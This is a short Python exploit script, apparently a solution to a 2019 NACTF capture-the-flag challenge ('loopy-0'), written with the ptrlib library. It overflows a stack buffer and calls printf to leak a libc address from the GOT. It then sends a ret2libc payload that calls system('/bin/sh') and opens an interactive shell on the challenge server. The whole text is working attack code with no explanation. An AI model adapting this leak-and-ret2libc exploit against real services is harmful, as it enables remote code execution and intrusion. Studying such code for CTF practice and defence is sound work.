from ptrlib import *

elf = ELF("./loopy-0")
libc = ELF("./libc.so.6")
sock = Socket("shell.2019.nactf.com", 31283)
payload = b'A' * 0x4c
payload += p32(elf.plt("printf"))
payload += p32(elf.symbol("vuln"))
payload += p32(elf.got("printf"))
sock.sendlineafter(">", payload)

sock.recvuntil(": ")
libc_base = u32(sock.recv()[len(payload):len(payload) + 4]) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x4c
payload += p32(libc_base + libc.symbol("system"))
payload += p32(libc_base + libc.symbol("exit"))
payload += p32(libc_base + next(libc.find("/bin/sh")))
sock.sendline(payload)

sock.interactive()
